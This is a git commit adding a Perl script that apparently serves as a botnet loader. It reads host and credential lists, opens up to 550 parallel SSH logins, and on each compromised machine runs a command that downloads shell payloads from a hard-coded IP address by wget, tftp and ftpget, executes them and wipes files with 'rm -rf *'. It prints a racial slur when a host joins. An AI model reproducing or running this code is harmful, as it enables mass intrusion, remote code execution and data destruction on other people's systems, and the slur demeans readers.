aff2f2d88765d85591ab7ed7dc2ef40fe95e5d1f
Daltonvisk <daltonzera@gmail.com>
2020-02-05 23:46:41 -0300

    Add files via upload

---
+++ scan/cli.pl
@@ -0,0 +1,32 @@
+#!/usr/bin/perl
+use Net::SSH2; use Parallel::ForkManager;
+
+$file = shift @ARGV;
+open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
+push(@newarray,@array);
+
+}
+my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
+scalar(@newarray); $i+=3) {
+        $pm->start and next;
+        $a = $i;
+        $b = $i+1;
+        $c = $i+2;
+        $ssh = Net::SSH2->new();
+        if ($ssh->connect($newarray[$c])) {
+                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
+                        $channel = $ssh->channel();
+                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://40.122.105.166/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 40.122.105.166 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 40.122.105.166; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 40.122.105.166 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+');//payloadhere
+                        sleep 10;
+                        $channel->close;
+                        print "\e[37;1mNigga They Joining: ".$newarray[$c]."\n";
+                } else {
+                        print "Maybe\n";
+                }
+        } else {
+                print "Box Broken\n";
+        }
+        $pm->finish;
+}
+$pm->wait_all_children;
